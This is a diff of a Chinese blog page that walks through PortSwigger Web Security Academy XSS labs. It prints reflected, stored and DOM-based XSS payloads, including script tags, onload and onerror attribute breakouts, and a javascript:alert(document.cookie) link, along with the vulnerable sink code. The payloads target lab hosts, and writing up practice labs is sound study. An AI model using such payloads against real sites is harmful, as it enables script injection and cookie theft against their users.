@@ -21,12 +21,12 @@
   <title>portswigger：portswigger 靶场之 XSS 篇(上) - Rabbit's Blog</title>
 
   
-    <meta name="description" content="APPRENTICE  All labs | Web Security Academy (portswigger.net)  1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区  3. 文档中">
+    <meta name="description" content="APPRENTICE  All labs | Web Security Academy (portswigger.net)  1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区  3. 文档中">
 <meta property="og:type" content="article">
 <meta property="og:title" content="portswigger 靶场之 XSS 篇(上)">
-<meta property="og:url" content="https://zero-yi7.github.io/2022/06/11/xss-part1/index.html">
+<meta property="og:url" content="https://askrabbit.cn/2022/06/11/xss-part1/">
 <meta property="og:site_name" content="Rabbit&#39;s Blog">
-<meta property="og:description" content="APPRENTICE  All labs | Web Security Academy (portswigger.net)  1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 &lt;script&gt;alert(1)&lt;&#x2F;script&gt;  2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区  3. 文档中">
+<meta property="og:description" content="APPRENTICE  All labs | Web Security Academy (portswigger.net)  1. 将 XSS 反射到 HTML 上下文中，没有编码 XSS payload，自是无需多言 1&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 2. 将 XSS 存储到 HTML 上下文中，没有任何编码 存储型的 XSS 在留言区  3. 文档中">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062108054.png">
 <meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109070.png">
@@ -63,7 +63,7 @@
   
   
   
-  
+  <meta name="keywords" content="编程, Web开发, 前端, 后端, JavaScript, Python, 个人成长, 生活, 思考, Rabbit, 安全, 读书, 微信读书, 女权">
 
   <!-- feed -->
   
@@ -93,21 +93,21 @@
 <div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/index.html"><div class="main" ff="title">portswigger</div></a></div></header>
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/portswigger/professional.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/portswigger/"><div class="main" ff="title">portswigger</div></a></div></header>
 
 <div class="nav-area">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/portswigger/" placeholder="在portswigger靶场中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
-<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item" title="探索" href="/wiki/"><span>探索</span></a></nav>
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
 </div>
 <div class="widgets">
 
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/index.html#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection.html"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1.html"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2.html"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf.html"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack.html"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf.html"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling.html"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal.html"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link" href="/wiki/portswigger/clickjacking.html"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span></a><a class="link" href="/wiki/portswigger/authentication.html"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control.html"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload.html"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws.html"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection.html"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">快速开始</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/#start"><span class="toc-text">portswigger 靶场记录</span></a></div><div class="widget-header dis-select"><span class="name">漏洞类型</span></div><div class="widget-body fs14"><a class="link" href="/wiki/portswigger/sql-injection"><span class="toc-text">portswigger 靶场之 SQL 注入</span></a><a class="link" href="/wiki/portswigger/xss-part1"><span class="toc-text">portswigger 靶场之 XSS 篇(上)</span></a><a class="link" href="/wiki/portswigger/xss-part2"><span class="toc-text">portswigger 靶场之 XSS 篇(下)</span></a><a class="link" href="/wiki/portswigger/ssrf"><span class="toc-text">portswigger 靶场之 SSRF 篇</span></a><a class="link" href="/wiki/portswigger/xml-external-entity-attack"><span class="toc-text">Portswigger 靶场之 XML 外部实体 (XXE) 注入</span></a><a class="link" href="/wiki/portswigger/csrf"><span class="toc-text">portswigger 靶场之 CSRF 篇</span></a><a class="link" href="/wiki/portswigger/http-request-smuggling"><span class="toc-text">PortSwigger 靶场之 HTTP 请求走私</span></a><a class="link" href="/wiki/portswigger/directory-traversal"><span class="toc-text">portswigger 靶场之目录遍历</span></a><a class="link" href="/wiki/portswigger/clickjacking"><span class="toc-text">portswigger 靶场之点击劫持（Clickjacking）</span></a><a class="link" href="/wiki/portswigger/authentication"><span class="toc-text">PortSwigger 之“身份认证”</span></a><a class="link" href="/wiki/portswigger/access-control"><span class="toc-text">Portswigger 靶场之“访问控制漏洞”</span></a><a class="link" href="/wiki/portswigger/file-upload"><span class="toc-text">Portswigger 靶场之“文件上传”</span></a><a class="link" href="/wiki/portswigger/business-logic-flaws"><span class="toc-text">Portswigger 靶场之“业务逻辑漏洞</span></a><a class="link" href="/wiki/portswigger/os-command-injection"><span class="toc-text">Portswigger 靶场 | 操作系统命令注入</span></a></div></widget>
 
 
 </div>
-<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a></div></footer>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
 </div></aside><div class="l_main" id="main">
 
 
@@ -117,7 +117,7 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/index.html">portswigger</a></div>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/portswigger/">portswigger</a></div>
 <div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2022-06-11T15:16:53.000Z">2022-06-11</time></span></div></div></div>
     
     <div class="bottom only-title">
@@ -135,32 +135,15 @@
 </blockquote>
 <h3 id="1-将-XSS-反射到-HTML-上下文中，没有编码">1. 将 XSS 反射到 HTML 上下文中，没有编码</h3>
 <p>XSS payload，自是无需多言</p>
-<pre><code class="language-javascript">&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 <h3 id="2-将-XSS-存储到-HTML-上下文中，没有任何编码">2. 将 XSS 存储到 HTML 上下文中，没有任何编码</h3>
 <p>存储型的 XSS 在留言区</p>
 <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062108054.png" alt="image-20230113112706729" style="zoom: 67%;" />
 <h3 id="3-文档中的-DOM-XSS-使用-source-location-search-编写接收器">3. 文档中的 DOM XSS.使用 source location.search 编写接收器</h3>
 <p>在搜索查询功能中有基于 DOM 的跨站点脚本漏洞</p>
 <p>在搜索框输入&quot;第三个&quot;，可以发现，输入的词被放到了 JavaScript 代码中的 img 标签的 src 属性中，插入 XSS 代码的话需要先闭合，使用<code>&quot;&gt;</code> `，分别闭合 img 标签和 src 属性</p>
-<pre><code class="language-js">// 在页面输入&quot;第三个&quot;
-&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; 
-
-// 插入 XSS 代码第一种方法
-&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;
-&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;
-&quot;&gt; 
-
-// 插入 XSS 代码第二种方法
-// 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot;
-1&quot; onload=&quot;alert(3)
-&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; 
-</code></pre>
-<pre><code class="language-js">// 源代码
-function trackSearch(query) &#123;
-    document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+query+'&quot;&gt;');
-&#125;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 在页面输入&quot;第三个&quot;</span><br>&lt;img src=<span class="hljs-string">&quot;/resources/images/tracker.gif?searchTerms=第三个&gt; </span><br><span class="hljs-string"></span><br><span class="hljs-string">// 插入 XSS 代码第一种方法</span><br><span class="hljs-string">&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(3)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&quot;&gt;&lt;script&gt;alert(3)&lt;/script&gt;<br>&quot;&gt; <br><br>// 插入 XSS 代码第二种方法<br>// 语法：onload，事件在页面载入完成后立即触发，onload=&quot;JavaScriptCode&quot;<br>1&quot; onload=&quot;alert(3)<br>&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=1&quot; onload=&quot;alert(3)&quot;&gt; <br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 源代码</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">trackSearch</span>(<span class="hljs-params">query</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+query+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109070.png" alt="image-20230113163011102"  />
 <center style="color:#C0C0C0;text-decoration:underline">搜索框输入“第三个”，F12 查看情况</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109659.png" alt="image-20230113163623818"></p>
@@ -168,18 +151,7 @@ function trackSearch(query) &#123;
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109317.png" alt="image-20230113165846287"></p>
 <center style="color:#C0C0C0;text-decoration:underline">插入 XSS 代码第二种方法</center>
 <h3 id="4-使用-source-location-search-in-innerHTML-sink-中的-DOM-XSS。">4. 使用 source location.search in innerHTML sink 中的 DOM XSS。</h3>
-<pre><code class="language-js">// 在页面输入&quot;第四个&quot;
-&lt;span id=&quot;searchMessage&quot;&gt;第四个&lt;/span&gt;
-
-// 插入 XSS 代码第一种方法
-// 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消
-&lt;svg onload=alert(4)&gt;
-&lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt;
-
-// 插入 XSS 代码第二种方法
-// 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件
-&lt;img src='' onerror=&quot;alert(4)&quot;&gt;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 在页面输入&quot;第四个&quot;</span><br>&lt;span id=<span class="hljs-string">&quot;searchMessage&quot;</span>&gt;第四个&lt;/span&gt;<br><br><span class="hljs-comment">// 插入 XSS 代码第一种方法</span><br><span class="hljs-comment">// 语法：onload，当页面载入完毕后执行 Javascript 代码，该事件不可取消</span><br>&lt;svg onload=alert(4)&gt;<br>&lt;span id=&quot;searchMessage&quot;&gt;&lt;svg onload=&quot;alert(4)&quot;&gt;&lt;/svg&gt;&lt;/span&gt;<br><br>// 插入 XSS 代码第二种方法<br>// 语法：onerror，当资源加载失败或无法使用时，触发onerror事件，因为前面的 src 为空，那意味着肯定会触发事件<br>&lt;img src=&#x27;&#x27; onerror=&quot;alert(4)&quot;&gt;<br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109893.png" alt="image-20230113220108244"></p>
 <center style="color:#C0C0C0;text-decoration:underline">搜索框输入“第四个”，F12 查看情况</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109053.png" alt="image-20230113220831825"></p>
@@ -188,25 +160,15 @@ function trackSearch(query) &#123;
 <center style="color:#C0C0C0;text-decoration:underline">插入 XSS 代码第二种方法</center>
 <h3 id="5-使用-location-search-source-在-jQuery-锚点-href-属性接收器中的-DOM-XSS">5. 使用 location.search source 在 jQuery 锚点 href 属性接收器中的 DOM XSS</h3>
 <p>Href 不仅可以跳转路径，也可以放入 JS 代码</p>
-<pre><code class="language-js">https://0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">https</span>:<span class="hljs-comment">//0a0000b103823255c2ce2cd0003e00a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109137.png" alt="image-20230113233811262"></p>
 <center style="color:#C0C0C0;text-decoration:underline">在 a 标签中</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109120.png" alt="image-20230113234217448"></p>
 <center style="color:#C0C0C0;text-decoration:underline">在 a 标签中注入 XSS 代码</center>
 <h3 id="6-在-jQuery-选择器中使用-hashchange-事件的-DOM-型-XSS">6. 在 jQuery 选择器中使用 hashchange 事件的 DOM 型 XSS</h3>
 <p>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>) ，它能够将另一个 HTML 页面嵌入到当前页面中。</p>
-<pre><code class="language-js">https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt;
-
-// 官方给的答案：
-&lt;iframe src=&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot; onload=&quot;this.src+='&lt;img src=x onerror=print(6)&gt;'&quot;&gt;&lt;/iframe&gt;
-</code></pre>
-<pre><code class="language-js">// 源代码
-$(window).on('hashchange', function()&#123;
-var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
-if (post) post.get(0).scrollIntoView();
-&#125;);
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">https</span>:<span class="hljs-comment">//0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&lt;img src=1 onerror=alert(1)&gt;</span><br><br><span class="hljs-comment">// 官方给的答案：</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a99009f0458a280c12dc1a500730025.web-security-academy.net/#&quot;</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;this.src+=&#x27;&lt;img src=x onerror=print(6)&gt;&#x27;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 源代码</span><br>$(<span class="hljs-variable language_">window</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;hashchange&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">var</span> post = $(<span class="hljs-string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>)) + <span class="hljs-string">&#x27;)&#x27;</span>);<br><span class="hljs-keyword">if</span> (post) post.<span class="hljs-title function_">get</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">scrollIntoView</span>();<br>&#125;);<br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109129.png" alt="image-20230116100544501"></p>
 <center style="color:#C0C0C0;text-decoration:underline">直接在网址注入</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/portswigger%20%E9%9D%B6%E5%9C%BA%E4%B9%8B%20XSS%20%E7%AF%87(%E4%B8%8A)/202410062109758.png" alt="image-20230116102022481"></p>
@@ -226,9 +188,7 @@ if (post) post.get(0).scrollIntoView();
 <center style="color:#C0C0C0;text-decoration:underline">javascript:alert(8) </center>
 <h3 id="9-将-XSS-反射到带有尖括号-HTML-编码的-JavaScript-字符串中">9. 将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中</h3>
 <p>输入<code>ABC</code> 发现是出现在了 script 标签中，尝试闭合弹出</p>
-<pre><code class="language-js">var searchTerms = 'ABC';
-document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'&quot;&gt;');
-</code></pre>
